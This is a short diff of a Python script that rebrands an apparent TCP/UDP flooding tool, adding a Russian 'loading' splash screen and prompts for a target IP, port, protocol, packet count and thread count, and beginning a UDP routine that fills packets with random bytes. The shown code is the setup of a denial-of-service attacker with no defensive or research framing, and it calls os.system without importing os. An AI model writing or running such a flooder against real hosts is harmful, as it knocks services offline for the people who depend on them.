@@ -1,19 +1,19 @@
-
-##coded by plotz
-
+##coded by ded
+from colorama import Fore, Back, Style
 import random
 import socket
 import threading
 import time
+os.system("clear")
+print(Fore.GREEN +"З А Г Р У З К А....")
+time.sleep(3.5)
+os.system("clear")
 
-print("This tools made by IzcoGanz")
-time.sleep(5)
-
-ip = str(input("[+] IP : "))
-port = int(input("[+] Port : "))
-choice = str(input("[+] Methods TCP/UDP : "))
-times = int(input("[+] Packet : "))
-threads = int(input("[+] Threads : "))
+ip = str(input("[+] IP : =>"))
+port = int(input("[+] Port : =>"))
+choice = str(input("[+] Methods TCP/UDP : =>"))
+times = int(input("[+] Packet : =>"))
+threads = int(input("[+] Threads : =>"))
 
 def udp():
 	data = random._urandom(1180)
